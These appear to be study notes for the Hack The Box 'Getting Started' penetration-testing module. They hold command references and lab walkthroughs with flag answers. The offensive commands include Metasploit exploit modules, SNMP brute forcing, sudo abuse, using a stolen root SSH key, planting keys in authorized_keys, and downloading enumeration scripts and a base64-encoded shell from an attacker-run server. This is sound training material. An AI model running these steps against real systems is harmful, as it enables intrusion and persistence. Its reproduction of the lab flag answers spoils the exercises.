# 🔴 Hack The Box — Penetration Tester Path

## 📋 Syllabus

### Introduction
1. Penetration Testing Process
2. Getting Started

### Reconnaissance, Enumeration & Attack Planning
3. Network Enumeration with Nmap
4. Footprinting
5. Information Gathering - Web Edition
6. Vulnerability Assessment
7. File Transfers
8. Shells & Payloads
9. Using the Metasploit Framework

### Exploitation & Lateral Movement
10. Password Attacks
11. Attacking Common Services
12. Pivoting, Tunneling, and Port Forwarding
13. Active Directory Enumeration & Attacks

### Web Exploitation
14. Using Web Proxies
15. Attacking Web Applications with Ffuf
16. Login Brute Forcing
17. SQL Injection Fundamentals
18. SQLMap Essentials
19. Cross-Site Scripting (XSS)
20. File Inclusion
21. File Upload Attacks
22. Command Injections
23. Web Attacks
24. Attacking Common Applications

### Post-Exploitation
25. Linux Privilege Escalation
26. Windows Privilege Escalation

### Reporting & Capstone
27. Documentation & Reporting
28. Attacking Enterprise Networks

---

## 🔑 Main Stages

| Stage | Description |
|---|---|
| **Pre-Engagement** | Define scope, rules of engagement, and contracts |
| **Information Gathering** | Collect target data passively and actively |
| **Vulnerability Assessment** | Identify weaknesses in systems and services |
| **Exploitation** | Gain initial access to the target |
| **Post-Exploitation** | Escalate privileges and collect sensitive data |
| **Lateral Movement** | Move across the internal network |
| **Proof of Concept** | Document how attacks were executed |
| **Post-Engagement** | Deliver report and clean up artifacts |

![Penetration Testing Process](https://github.com/user-attachments/assets/e5c9a62b-5186-4da0-a260-d2e660e8bccd)

---

## 🛰️ Service Scanning

### Commands Reference

| Command | Description |
|---|---|
| `nmap 10.129.42.253` | Run basic Nmap scan on an IP |
| `nmap -sV -sC -p- 10.129.42.253` | Run full script scan with version detection |
| `locate scripts/citrix` | List available Nmap scripts |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run a specific Nmap script |
| `netcat 10.10.10.10 22` | Grab banner of an open port |
| `smbclient -N -L \\\\10.129.42.253` | List SMB shares (no auth) |
| `smbclient \\\\10.129.42.253\\users` | Connect to an SMB share |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP on an IP |
| `onesixtyone -c dict.txt 10.129.42.254` | Brute force SNMP community string |

### Lab

**Q1: What does Nmap display as the version of the service running on port 8080?**

```bash
nmap -sV <target-ip>
```

> ✅ Answer: `Apache Tomcat`

---

**Q2: What non-default port is the Telnet service running on?**

```bash
nmap -sV <target-ip>
```

> ✅ Answer: `2323`

---

**Q3: List SMB shares, connect as `bob`, and retrieve `flag.txt` from the `flag` folder.**

```bash
smbclient -N -L //10.129.47.44              # List shares anonymously
smbclient -U bob //10.129.47.44/users       # Connect as bob
cd flag
get flag.txt
cat flag.txt
```

> ✅ Answer: `dceece590f3284c3866305eb2473d099`

---

## 🌐 Web Enumeration

### Commands Reference

| Command | Description |
|---|---|
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Directory brute-force scan |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Subdomain enumeration |
| `curl -IL https://www.inlanefreight.com` | Grab website banner/headers |
| `whatweb 10.10.10.121` | Identify webserver, CMS, and tech stack |
| `curl 10.10.10.121/robots.txt` | Check for hidden paths in robots.txt |
| `Ctrl + U` | View page source in Firefox |

### Lab

**Q: Enumerate the target and capture the flag.**

Target: `154.57.164.80:32036`

**Steps taken:**
1. Inspected page source — nothing useful initially
2. Ran `gobuster` for directory enumeration
3. Checked `robots.txt` → found `/admin` page
4. Inspected admin page source → found hardcoded credentials
5. Logged in and retrieved the flag

> ✅ Flag: `HTB{w3b_3num3r4710n_r3v34l5_53cr375}`

---

## 🔍 Public Exploits

### Commands Reference

| Command | Description |
|---|---|
| `searchsploit openssh 7.2` | Search for public exploits for a service/app |
| `msfconsole` | Start the Metasploit Framework |
| `search exploit eternalblue` | Search for public exploits in MSF |
| `use exploit/windows/smb/ms17_010_psexec` | Load an MSF module |
| `show options` | Show required options for the loaded module |
| `set RHOSTS 10.10.10.40` | Set a value for a module option |
| `check` | Test if the target is vulnerable |
| `exploit` | Run the exploit |

### Lab

**Q: Identify services running on the target, find a public exploit, and read `/flag.txt`.**

**Steps taken:**

1. Scanned the target and identified a WordPress service with **Simple Backup plugin v2.7.10**
2. Searched MSF for a matching module:
```bash
search wordpress 2.7.10
# Found: auxiliary/scanner/http/wp_simple_backup_file_read
```

3. Loaded and configured the module:
```bash
use 0
set RHOSTS 154.57.164.68
set RPORT 32095
set FILEPATH flag.txt
exploit
```

4. MSF saved the output to `~/.msf4/loot/` — read it with:
```bash
cat 20260402045240_default_154.57.164.68_simplebackup.tra_445157.txt
```

> ✅ Flag: `HTB{my_f1r57_h4ck}`

## Privilege Escalation
## 🔐 Privilege Escalation

### Commands Reference

| Command | Description |
|---------|-------------|
| `./linpeas.sh` | Run linpeas script to enumerate remote server |
| `sudo -l` | List available sudo privileges |
| `sudo -u user /bin/echo Hello World!` | Run a command as another user via sudo |
| `sudo su -` | Switch to root user (if allowed) |
| `sudo su user -` | Switch to another user (if allowed) |
| `ssh-keygen -f key` | Generate a new SSH key pair |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add public key to authorized_keys |
| `ssh root@10.10.10.10 -i key` | SSH using a private key |

---

## 🧪 Lab 1

### 🔑 Initial Access as User1

We are given credentials for `user1` and instructed to SSH into a remote server:

```bash
ssh -p 42141 user1@83.136.255.192
```

### 🕵️‍♂️ Enumerating Privileges

Once connected, we check for sudo privileges:

```bash
sudo -l
```

This reveals that `user1` can run `/bin/bash` as `user2` without a password.

### 🔄 Lateral Movement to User2

We leverage this to switch users:

```bash
sudo -u user2 /bin/bash
```

Now operating as `user2`, navigate to the home directory and retrieve the flag:

```bash
cat flag.txt
```

> ✅ Flag 1: `HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}`

---

## 🧪 Lab 2

### 🧠 Escalating to Root

A hint about `chmod` suggests checking file permissions, especially SSH-related files.

### 📂 Exploring Root Directory

```bash
cd /root
ls -a
```

Inside `/root/.ssh`, an unprotected private key (`id_rsa`) is discovered.

### 🔓 Extracting the Private Key

Copy the private key and recreate it locally:

```bash
nano key
```

Set correct permissions:

```bash
chmod 600 key
```

### 🚀 Gaining Root Access

Use the private key to authenticate as root:

```bash
ssh -i key -p 42141 root@83.136.255.192
```

Once connected:

```bash
cat flag.txt
```

> ✅ Flag 2: `HTB{pr1v1l363_35c4l4710n_2_r007}`

---

## ✅ Takeaways

* Always run `sudo -l` to identify privilege escalation paths
* Misconfigured sudo permissions enable lateral movement
* Check `.ssh` directories for exposed private keys
* Improper file permissions can lead to full system compromise
* Privilege escalation often relies on misconfigurations rather than exploits

## 📁 Transferring Files

### Commands Reference

| Command | Description |
|---------|-------------|
| `python3 -m http.server 8000` | Start a local webserver |
| `wget http://10.10.14.1:8000/linpeas.sh` | Download a file on the remote server from our local machine |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download a file on the remote server from our local machine |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer a file to the remote server with scp (requires SSH access) |
| `base64 shell -w 0` | Convert a file to base64 |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell` | Convert a file from base64 back to its original format |
| `md5sum shell` | Check the file's md5sum to ensure it converted correctly |

[⬇️ Download Getting Started  - cheatsheet.pdf](./Getting%20Started%20-%20cheatsheet.pdf)
